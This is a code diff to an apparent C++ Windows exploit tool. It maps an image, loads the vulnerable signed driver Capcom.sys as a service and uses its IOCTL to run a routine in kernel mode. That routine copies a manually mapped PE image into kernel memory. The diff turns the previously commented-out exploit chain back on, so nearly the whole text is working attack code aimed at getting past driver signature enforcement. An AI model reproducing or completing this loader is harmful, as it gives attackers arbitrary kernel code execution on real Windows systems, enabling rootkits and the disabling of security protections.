@@ -9,6 +9,10 @@
 
 DECLARE_UNICODE_STRING(strAllocPoolWithTag, L"ExAllocatePoolWithTag");
 
+HMODULE PayloadImage;
+SIZE_T PayloadSize;
+SIZE_T PayloadEntry;
+
 PVOID NTAPI LoaderPayload(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress)
 {
 	__debugbreak();
@@ -18,21 +22,26 @@ PVOID NTAPI LoaderPayload(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress)
 	if (drvmap)
 	{
 		// Nice intrinsic trick from https://github.com/Professor-plum/Reflective-Driver-Loader/blob/master/Hadouken/Hadouken.c
-		__movsq((PDWORD64)drvmap, (PDWORD64)DriverLoader::TargetDriverPE.c_str(), (SIZE_T)DriverLoader::TargetDriverPE.size() / sizeof(INT64));
+		__movsq((PDWORD64)drvmap, (PDWORD64)PayloadImage, (SIZE_T)(PayloadSize / sizeof(INT64)));
 	}
 	return nullptr;
 } 
 
 int main()
 {
-	PEImage loader(L"Capcom.sys");
-	HMODULE base = loader.MapFlat();
-	printf("Mapped Capcom.sys to: %p", base);
-	/*DriverLoader loader;
+	auto image = make_unique<PEImage>(L"Capcom.sys");
+	PayloadImage = image->MapForKernel();
+	PayloadSize = image->GetMappedSize();
+	PayloadEntry = image->GetEntryPointRVA();
+
+	Util::DebugPrint("Mapped Capcom.sys to: %p\n", PayloadImage);
+	Util::DebugPrint("EntryPointRVA: %p\n", PayloadEntry);
+
+	DriverLoader loader;
 	loader.LoadDriverFromFile(L".\\Capcom.sys");
 	loader.LoadCapcomService();
 	loader.ExecIoCtlWithTrampoline(LoaderPayload);
-	*/
+	
 	getchar();
     return 0;
 }
